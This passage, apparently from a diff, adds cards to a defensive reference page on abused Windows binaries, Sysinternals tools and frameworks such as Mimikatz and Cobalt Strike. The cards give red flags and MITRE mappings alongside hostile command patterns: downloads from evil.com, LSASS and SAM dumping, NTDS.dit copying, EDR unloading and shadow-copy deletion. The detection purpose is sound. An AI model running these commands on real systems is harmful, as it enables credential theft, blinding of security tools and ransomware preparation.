+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="schtasks scheduled task persistence lateral movement remote system">
+      <div class="tool-card__header">
+        <span class="tool-card__name">schtasks.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Schedules and manages Windows tasks.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Persistence tasks survive reboots (/sc onlogon)</li>
+            <li>Remote task creation for lateral movement (/s HOST)</li>
+            <li>Names mimic legit tasks: MicrosoftEdgeUpdate</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">schtasks /create /tn "Update" /tr "powershell -enc ..." /sc onlogon /ru SYSTEM
+schtasks /create /s REMOTEHOST /tn "..." /tr "..."</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">/create with ps/cmd in /tr</span>
+            <span class="rflag">/s flag = remote host</span>
+            <span class="rflag">/ru SYSTEM + suspicious cmd</span>
+            <span class="rflag">Task binary in %TEMP%</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1053/005/" target="_blank">T1053.005</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="sc service create persistence lateral edr stop disable">
+      <div class="tool-card__header">
+        <span class="tool-card__name">sc.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Service Control — manages Windows services.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Creates malicious services for persistence</li>
+            <li>Stops/disables AV and EDR services</li>
+            <li>Remote service install via PsExec combo</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">sc create EvilSvc binPath= "C:\Users\Public\p.exe"
+sc config &lt;AV_service&gt; start= disabled
+sc stop &lt;EDR_service&gt;</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">binPath in user-writable dir</span>
+            <span class="rflag">Stopping AV/EDR service names</span>
+            <span class="rflag">Remote target \\HOST</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1543/003/" target="_blank">T1543.003</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="reg registry run persistence sam credential dump hive">
+      <div class="tool-card__header">
+        <span class="tool-card__name">reg.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Registry command-line editor.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Adds Run/RunOnce keys for persistence</li>
+            <li>Dumps SAM, SYSTEM, SECURITY hives for credential cracking</li>
+            <li>Disables UAC and Defender via registry</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">reg add HKCU\...\Run /v Update /d "C:\malware.exe"
+reg save HKLM\SAM C:\Users\Public\sam.hive
+reg save HKLM\SYSTEM C:\Users\Public\system.hive</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">add to Run / RunOnce</span>
+            <span class="rflag">save SAM/SYSTEM/SECURITY hive</span>
+            <span class="rflag">Disable Defender / UAC keys</span>
+            <span class="rflag">.hive files in user dirs</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1547/001/" target="_blank">T1547.001</a> / <a href="https://attack.mitre.org/techniques/T1003/002/" target="_blank">T1003.002</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="netsh portproxy firewall tunnel port forwarding helper dll">
+      <div class="tool-card__header">
+        <span class="tool-card__name">netsh.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Network shell — configures network settings.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Port forwarding tunnels traffic through compromised host</li>
+            <li>DLL helper persistence via netsh add helper</li>
+            <li>Disables Windows Firewall entirely</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">netsh interface portproxy add v4tov4 listenport=4444 connectaddress=attacker.com connectport=443
+netsh advfirewall set allprofiles state off
+netsh add helper C:\Users\Public\evil.dll</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">portproxy add</span>
+            <span class="rflag">advfirewall state off</span>
+            <span class="rflag">add helper with non-MS DLL</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1090/001/" target="_blank">T1090.001</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="vssadmin shadow copy delete ransomware pre-encryption recovery">
+      <div class="tool-card__header">
+        <span class="tool-card__name">vssadmin.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Volume Shadow Copy administrative tool.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Deletes all shadow copies — prevents recovery post-ransomware</li>
+            <li>Universal pre-encryption step across all ransomware families</li>
+            <li>Lists shadows for attacker awareness</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">vssadmin delete shadows /all /quiet
+vssadmin resize shadowstorage /maxsize=401MB</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">delete shadows = ransomware indicator</span>
+            <span class="rflag">/quiet flag</span>
+            <span class="rflag">Not from backup software</span>
+            <span class="rflag">Paired with bcdedit + wbadmin</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1490/" target="_blank">T1490</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="bcdedit boot recovery ransomware disable recoveryenabled">
+      <div class="tool-card__header">
+        <span class="tool-card__name">bcdedit.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Boot Configuration Data editor.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Disables automatic recovery — victims can't boot-repair</li>
+            <li>Part of the ransomware pre-detonation trio</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">bcdedit /set {default} recoveryenabled No
+bcdedit /set {default} bootstatuspolicy ignoreallfailures</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">recoveryenabled No</span>
+            <span class="rflag">bootstatuspolicy ignoreallfailures</span>
+            <span class="rflag">Paired with vssadmin + wbadmin</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1490/" target="_blank">T1490</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="wbadmin backup delete catalog ransomware recovery">
+      <div class="tool-card__header">
+        <span class="tool-card__name">wbadmin.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Windows Backup administrative tool.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Destroys backups: wbadmin delete catalog -quiet</li>
+            <li>Pairs with vssadmin + bcdedit (ransomware trio)</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">delete catalog</span>
+            <span class="rflag">Running alongside vssadmin/bcdedit</span>
+            <span class="rflag">Not from backup software</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1490/" target="_blank">T1490</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="fltmc filter edr crowdstrike sentinelone unload blind minifilter">
+      <div class="tool-card__header">
+        <span class="tool-card__name">fltMC.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Filter Manager control — manages minifilter drivers.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Unloads EDR minifilter drivers to blind security tools</li>
+            <li>CrowdStrike, SentinelOne, Carbon Black run as minifilters</li>
+            <li>After unload EDR loses file/process/network visibility</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">fltMC.exe unload &lt;filtername&gt;</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">unload command</span>
+            <span class="rflag">Filter = EDR product name</span>
+            <span class="rflag">Rare in legitimate use</span>
+            <span class="rflag">Executed before payload deploy</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1562/001/" target="_blank">T1562.001</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="esentutl ntds.dit ad active directory credential dump copy locked">
+      <div class="tool-card__header">
+        <span class="tool-card__name">esentutl.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Extensible Storage Engine utility.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Copies locked files including NTDS.dit (AD database)</li>
+            <li>Used for offline credential extraction</li>
+            <li>Can copy over VSS shadow snapshots</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">esentutl /y \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit /d C:\Users\Public\ntds.dit /o</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">Any reference to ntds.dit</span>
+            <span class="rflag">VSS shadow path in args</span>
+            <span class="rflag">Output in user-writable dir</span>
+            <span class="rflag">Followed by reg save SYSTEM hive</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1003/003/" target="_blank">T1003.003</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="nltest domain trust dclist recon active directory enumeration">
+      <div class="tool-card__header">
+        <span class="tool-card__name">nltest.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Network and domain diagnostic tool.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Enumerates domain controllers: nltest /dclist:DOMAIN</li>
+            <li>Enumerates domain trusts: nltest /domain_trusts</li>
+            <li>Present in virtually every enterprise intrusion recon phase</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">/dclist: or /domain_trusts</span>
+            <span class="rflag">Non-IT / non-admin user</span>
+            <span class="rflag">Part of recon chain</span>
+            <span class="rflag">Child of Office / browser</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1482/" target="_blank">T1482</a></span>
+        <span class="sev sev--medium">Medium</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="bitsadmin bits download transfer persistence notify">
+      <div class="tool-card__header">
+        <span class="tool-card__name">bitsadmin.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Background Intelligent Transfer Service manager.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Downloads files silently, survives reboots in BITS queue</li>
+            <li>SetNotifyCmdLine executes command after download</li>
+            <li>Evades monitoring — traffic looks like Windows Update</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">bitsadmin /transfer job /download /priority high http://evil.com/p.exe C:\Temp\p.exe</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">/transfer with external URL</span>
+            <span class="rflag">/SetNotifyCmdLine</span>
+            <span class="rflag">BITS job by non-system process</span>
+            <span class="rflag">Download to %TEMP% / Public</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1197/" target="_blank">T1197</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="cmdkey credential manager rdp password list recon">
+      <div class="tool-card__header">
+        <span class="tool-card__name">cmdkey.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Manages stored credentials in Windows Credential Manager.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Lists all stored credentials (RDP, network shares)</li>
+            <li>No elevated privileges required</li>
+            <li>First step for lateral movement path discovery</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">cmdkey /list</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">/list post-compromise</span>
+            <span class="rflag">Non-admin account</span>
+            <span class="rflag">Followed by runas /savedcred</span>
+            <span class="rflag">Part of recon chain</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1555/004/" target="_blank">T1555.004</a></span>
+        <span class="sev sev--medium">Medium</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="psr problem steps recorder screenshot surveillance capture">
+      <div class="tool-card__header">
+        <span class="tool-card__name">psr.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Problem Steps Recorder — records user actions with screenshots.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Silently records all user actions with timestamps</li>
+            <li>Captures credentials entered in browser/VPN/apps</li>
+            <li>Output saved as ZIP — easy to exfiltrate</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">psr.exe /start /output C:\Temp\capture.zip /maxsc 999</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">/start with output path</span>
+            <span class="rflag">ZIP in unusual location</span>
+            <span class="rflag">Non-helpdesk context</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1113/" target="_blank">T1113</a></span>
+        <span class="sev sev--medium">Medium</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="pktmon packet capture network built-in wireshark credentials">
+      <div class="tool-card__header">
+        <span class="tool-card__name">pktmon.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Built-in Windows packet monitor (Windows 10 1809+).</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Captures live traffic without installing third-party tools</li>
+            <li>Converts to PCAP for credential/session capture</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">pktmon start --capture --file-name C:\Users\Public\capture.etl
+pktmon pcapng pktmon.etl -o capture.pcap</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">start --capture</span>
+            <span class="rflag">.etl / .pcap in user dirs</span>
+            <span class="rflag">Non-network-admin running it</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1040/" target="_blank">T1040</a></span>
+        <span class="sev sev--medium">Medium</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="cmstp uac bypass inf applocker elevate">
+      <div class="tool-card__header">
+        <span class="tool-card__name">cmstp.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Microsoft Connection Manager Profile Installer.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>UAC bypass — auto-elevates via .inf files, no prompt</li>
+            <li>Bypasses AppLocker entirely</li>
+            <li>Rare in legitimate use — any execution is suspicious</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">.inf file in arguments</span>
+            <span class="rflag">Elevated child process spawned</span>
+            <span class="rflag">.inf from %TEMP% / Downloads</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1218/003/" target="_blank">T1218.003</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="installutil dotnet applocker bypass cobalt strike stager">
+      <div class="tool-card__header">
+        <span class="tool-card__name">installutil.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">.NET installation utility for .NET assemblies.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Executes code via [RunInstaller(true)] class in .NET DLL</li>
+            <li>Bypasses AppLocker (trusted .NET context)</li>
+            <li>Used as Cobalt Strike stager</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">Outside install context</span>
+            <span class="rflag">DLL in %TEMP% / user path</span>
+            <span class="rflag">Non-developer user</span>
+            <span class="rflag">Spawning cmd / powershell</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1218/004/" target="_blank">T1218.004</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="eventvwr uac bypass registry mscfile elevated">
+      <div class="tool-card__header">
+        <span class="tool-card__name">eventvwr.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Windows Event Viewer.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>UAC bypass via HKCU\Software\Classes\mscfile registry hijack</li>
+            <li>Auto-elevates and loads hijacked key — no user prompt</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">Unexpected elevated child process</span>
+            <span class="rflag">mscfile registry modified before execution</span>
+            <span class="rflag">Elevated cmd/powershell as child</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1548/002/" target="_blank">T1548.002</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="taskkill kill edr av process ransomware service">
+      <div class="tool-card__header">
+        <span class="tool-card__name">taskkill.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Terminates running processes.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Kills AV/EDR agents before ransomware execution</li>
+            <li>Terminates backup/DB services to unlock files</li>
+            <li>Ransomware pre-detonation kills 10–50 processes in seconds</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">10+ kills in rapid succession</span>
+            <span class="rflag">Targeting MsMpEng / csfalconservice</span>
+            <span class="rflag">Targeting veeam / sqlserver</span>
+            <span class="rflag">Run via batch from %TEMP%</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1562/001/" target="_blank">T1562.001</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="lolbin" data-tags="diskshadow vsss ntds fin8 exec script server">
+      <div class="tool-card__header">
+        <span class="tool-card__name">diskshadow.exe</span>
+        <span class="tool-card__cat cat--lolbin">LOLBin</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Disk Shadow Service interactive tool (server OS).</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Executes arbitrary commands via script file (exec directive)</li>
+            <li>Accesses VSS snapshots to steal NTDS.dit</li>
+            <li>Used by FIN8, ransomware groups</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">diskshadow.exe /s C:\Users\Public\shadow.txt
+# Inside shadow.txt:
+exec "cmd.exe /c copy ..."</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">/s with script in user-writable path</span>
+            <span class="rflag">exec in script content</span>
+            <span class="rflag">Non-server OS use</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1218/" target="_blank">T1218</a> / <a href="https://attack.mitre.org/techniques/T1490/" target="_blank">T1490</a></span>
+        <span class="sev sev--high">High</span>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         SYSINTERNALS
+    ══════════════════════════════════════════ -->
+
+    <div class="tool-card" data-cat="sysint" data-tags="psexec lateral movement smb conti ryuk lockbit psexesvc">
+      <div class="tool-card__header">
+        <span class="tool-card__name">PsExec</span>
+        <span class="tool-card__cat cat--sysint">Sysinternals</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Remote process execution over SMB (Sysinternals).</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Primary lateral movement tool — executes on remote hosts</li>
+            <li>Drops PSEXESVC.exe to ADMIN$ share on target</li>
+            <li>Used by Conti, Ryuk, LockBit, most ransomware operators</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">PSEXESVC.exe on remote hosts</span>
+            <span class="rflag">Event ID 7045 + 4697 on target</span>
+            <span class="rflag">SMB → remote process creation</span>
+            <span class="rflag">Non-admin workstation running it</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1569/002/" target="_blank">T1569.002</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="sysint" data-tags="procdump lsass credential dump sysinternals signed">
+      <div class="tool-card__header">
+        <span class="tool-card__name">procdump.exe</span>
+        <span class="tool-card__cat cat--sysint">Sysinternals</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Microsoft Sysinternals process dump tool.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Dumps LSASS memory for offline credential extraction</li>
+            <li>Microsoft-signed — often bypasses AV detection</li>
+            <li>Common Mimikatz alternative</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Malicious command patterns</div>
+          <div class="tool-card__code">procdump.exe -ma lsass.exe lsass.dmp
+procdump64.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp</div>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">Any invocation targeting lsass.exe</span>
+            <span class="rflag">.dmp in user-writable path</span>
+            <span class="rflag">Followed by exfil (WinSCP/Rclone)</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1003/001/" target="_blank">T1003.001</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <!-- ══════════════════════════════════════════
+         OFFENSIVE FRAMEWORKS
+    ══════════════════════════════════════════ -->
+
+    <div class="tool-card" data-cat="offensive" data-tags="cobalt strike beacon c2 malleable pipe injection">
+      <div class="tool-card__header">
+        <span class="tool-card__name">Cobalt Strike (Beacon)</span>
+        <span class="tool-card__cat cat--offensive">Offensive</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Commercial C2 framework — cracked versions widely abused.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Full post-exploitation: shell, keylogging, lateral movement, cred dump</li>
+            <li>Malleable C2 profiles mimic legitimate traffic (HTTP/DNS)</li>
+            <li>Named pipe comms between beacons for internal pivoting</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">Processes with no icon/version info</span>
+            <span class="rflag">rundll32/msbuild outbound HTTPS</span>
+            <span class="rflag">Pipe: \pipe\MSSE-* / postex_*</span>
+            <span class="rflag">Default CS SSL cert hashes (JA3)</span>
+            <span class="rflag">Sleep jitter in network traffic</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: Multiple TTPs</span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="offensive" data-tags="mimikatz lsass sekurlsa dcsync credential dump golden ticket">
+      <div class="tool-card__header">
+        <span class="tool-card__name">Mimikatz</span>
+        <span class="tool-card__cat cat--offensive">Offensive</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">Credential extraction toolkit.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>sekurlsa::logonpasswords — plaintext passwords from LSASS</li>
+            <li>lsadump::dcsync — replicates AD creds without touching LSASS</li>
+            <li>Pass-the-hash, golden/silver ticket attacks</li>
+          </ul>
+        </div>
+        <div class="tool-section">
+          <div class="tool-section__label">Red flags</div>
+          <div class="tool-card__flags">
+            <span class="rflag">Sysmon Event ID 10: lsass.exe access</span>
+            <span class="rflag">sekurlsa / lsadump / privilege::debug</span>
+            <span class="rflag">DCSync: Event 4662 + Replication GUID</span>
+            <span class="rflag">SeDebugPrivilege on non-system process</span>
+          </div>
+        </div>
+      </div>
+      <div class="tool-card__footer">
+        <span class="mitre-badge">MITRE: <a href="https://attack.mitre.org/techniques/T1003/" target="_blank">T1003</a></span>
+        <span class="sev sev--critical">Critical</span>
+      </div>
+    </div>
+
+    <div class="tool-card" data-cat="offensive" data-tags="rubeus kerberoasting asrep kerberos ticket harvest">
+      <div class="tool-card__header">
+        <span class="tool-card__name">Rubeus</span>
+        <span class="tool-card__cat cat--offensive">Offensive</span>
+      </div>
+      <div class="tool-card__body">
+        <p class="tool-card__what">.NET Kerberos attack toolkit.</p>
+        <div class="tool-section">
+          <div class="tool-section__label">How it's abused</div>
+          <ul>
+            <li>Kerberoasting: service tickets for offline cracking</li>
+            <li>AS-REP Roasting: targets pre-auth disabled accounts</li>
+            <li>Ticket harvesting and injection</li>
